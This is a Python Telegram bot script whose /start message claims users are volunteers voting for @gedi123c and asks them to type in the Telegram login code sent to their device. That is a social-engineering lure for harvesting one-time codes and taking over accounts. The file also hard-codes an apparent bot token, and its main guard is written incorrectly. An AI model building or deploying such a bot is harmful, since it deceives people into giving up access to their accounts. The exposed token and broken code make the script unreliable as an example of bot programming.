import logging
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Set up the bot and token
bot_token = '5192157317:AAGmKxzFvApBT5kFXn7aIrdiVTPxLkZ9Up0'
bot = telegram.Bot(token=bot_token)

# Handler for the /start command
def start(update, context):
    """Send a welcome message when the command /start is issued."""
    bot.send_message(chat_id=update.effective_chat.id, text="Hello!Thanks for being volenteer to vote for @gedi123c please enter a telegram code sent to your device:")
    print(update.effective_chat.id)

# Handler for messages containing login code
def login(update, context):
    """Verify the login code and send appropriate response."""
    chat_id = update.effective_chat.id
    message_text = update.message.text
    
    # Check if the login code is correct
    if message_text == get_login_code(update.effective_user.username):
        bot.send_message(chat_id=chat_id, text="Login successful!")
    else:
        bot.send_message(chat_id=chat_id, text="Invalid login code. Please try again.")

# Helper function to get the login code for a user
def get_login_code(username):
    """Replace this function with your own logic to retrieve the login code for the user."""
    # In this example, we are using a hard-coded login code for each user
    login_codes = {
        'user1': '123456',
        'user2': '987654',
        'user3': 'abcdef'
    }
    return login_codes.get(username, '')

def main():
    # Create an updater object and attach it to the bot
    updater = Updater(bot_token, use_context=True)

    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # Register handler for the /start command
    dp.add_handler(CommandHandler("start", start))

    # Register handler for login codes
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, login))

    # Start the bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C
    updater.idle()

# Run the main function
name='main'
if name == 'main':
    main()
